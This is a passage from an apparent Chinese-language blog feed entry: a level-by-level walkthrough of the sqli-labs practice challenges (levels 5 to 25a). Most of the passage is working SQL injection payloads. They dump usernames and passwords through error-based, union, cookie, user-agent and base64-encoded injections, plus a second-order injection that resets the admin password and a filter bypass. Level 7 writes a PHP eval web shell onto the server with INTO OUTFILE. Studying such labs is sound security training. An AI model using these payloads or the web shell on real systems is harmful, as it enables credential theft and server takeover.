--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; union select 1,count(*),concat_ws(&amp;#x27;-&amp;#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; and table_schema = database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; union select 1,count(*),concat_ws(&amp;#x27;-&amp;#x27;,(select substring(group_concat(username,&amp;#x27;-&amp;#x27;,password),1,64) from users),floor(rand(0)*2)) as x from information_schema.tables group by x --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;修改1,64即可&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less6&lt;br&gt;
id=1&amp;quot; 与 less5 一样&lt;/p&gt;
&lt;p&gt;less7&lt;br&gt;
 双括号单引号字符型，导出文件注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27;)) union select 1,2,&amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&amp;#x27; into outfile &amp;quot;D:\phpstudy_pro\WWW\test.php&amp;quot; --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less8 与 less5 一样&lt;br&gt;
 less9 时间盲注&lt;br&gt;
 less10 双引号时间盲注&lt;/p&gt;
&lt;p&gt;less11&lt;br&gt;
 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式&lt;br&gt;
 uname=11&amp;amp;passwd=1&amp;amp;submit=Submit&lt;br&gt;
 判断字符型&lt;br&gt;
接下来用基本的 union 注入就欧克&lt;br&gt;
 less12&lt;br&gt;
&amp;quot;) 型，联合注入&lt;br&gt;
 less13&lt;br&gt;
)’ # 加上报错注入&lt;br&gt;
 less14&lt;br&gt;
“# 加上报错注入&lt;br&gt;
 less15&lt;br&gt;
 不显示报错信息只能盲注&lt;br&gt;
单引号字符型的布尔盲注:&lt;br&gt;
1’ --+&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=&#34;&gt; 用脚本 less15.py&lt;/span&gt;&lt;br&gt;
 用法:&lt;br&gt;
from less15 import *&lt;br&gt;
Database15()&lt;br&gt;
Tables15()&lt;br&gt;
 Columns15 (‘库’,‘表’)&lt;br&gt;
 Content15 (‘库’,‘表’,‘字段’,‘字段’)&lt;br&gt;
less16&lt;br&gt;
 双引号字符型加括号的盲注&lt;br&gt;
 1”) --+&lt;br&gt;
 脚本:less16.py&lt;/p&gt;
&lt;p&gt;less17&lt;br&gt;
1. 注入点在 password 栏里，单引号字符加报错注入&lt;br&gt;
 2. 先抓包，copy to file, 用 sqlmap 工具&lt;br&gt;
 python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -r 路径&lt;/p&gt;
&lt;p&gt;less18&lt;br&gt;
 注入点在 user-agent, 且用户名密码必须正确&lt;br&gt;
注意：闭合之前的部分必须为空，很恶心&lt;br&gt;
’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’&lt;/p&gt;
&lt;p&gt;最后:&lt;br&gt;
’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’&lt;/p&gt;
&lt;p&gt;less19&lt;br&gt;
 与 18 一样，注入点在 referer&lt;/p&gt;
&lt;p&gt;less20&lt;br&gt;
 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=Dumb&amp;#x27; or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;为什么写成这种格式？使整个SQL语句为恒真，不管Dumb是否正确都能爆出结果&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less21&lt;br&gt;
 登录 burp 抓到两个包，第一个是发送用户名和密码的 POST 报文，第二个是 GET 报文且携带 cookie&lt;/p&gt;
&lt;p&gt;Cookie：uname=…&lt;br&gt;
 这个… 是 base64 编码的，通过 burp 的 decoder 模块使用可以看出&lt;br&gt;
单引号单括号字符型报错注入，需要把 payload 进行 base64 编码，（如果 base64 编码结果包含等号还要进行 url 编码），再作为 uname 的值发送&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;) or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&amp;#x27;^&amp;#x27;,password)) from users),1,31),0x7e),1) or (&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;经过 base64 编码没有等号，直接用&lt;/p&gt;
&lt;p&gt;less22&lt;br&gt;
less21 单引号 -&amp;gt; 双引号&lt;/p&gt;
&lt;p&gt;less23&lt;br&gt;
 又回到了 get 方法，这里过滤了 &lt;code&gt;--和#&lt;/code&gt; ,%23 尝试不行，于是换一种方法&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; union select 1,2,3 or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;构造恒真语句,or &amp;#x27;表示true(1),3 or &amp;#x27;就是1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,(select group_concat(username,0x7e,password) from users),3 or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less24&lt;br&gt;
 二次注入&lt;br&gt;
 login.php 中对输入的 username 和 password 进行了 mysql_real_escape_string () 函数处理，转义了单引号等字符&lt;br&gt;
在注册用户和修改密码的所有输入参数也做了这个处理&lt;/p&gt;
&lt;p&gt;注册用户名 admin’#, 密码随意，登录进去修改密码为 456&lt;br&gt;
 这时的 SQL 语句: &lt;code&gt;$sql = &amp;quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &amp;quot;;&lt;/code&gt; &lt;br&gt;
 造成:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;UPDATE users SET PASSWORD=&amp;#x27;456&amp;#x27; where username=&amp;#x27;admin&amp;#x27;#&amp;#x27; and password=&amp;#x27;$curr_pass&amp;#x27; &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再直接 admin,456 就登录了&lt;/p&gt;
&lt;p&gt;less25&lt;br&gt;
 单引号字符型，过滤了 and 和 or&lt;br&gt;
 双写绕过:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less25a&lt;br&gt;
 没有单引号&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1 union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <updated>2023-04-28T07:34:52.582Z</updated>
    </entry>
</feed>
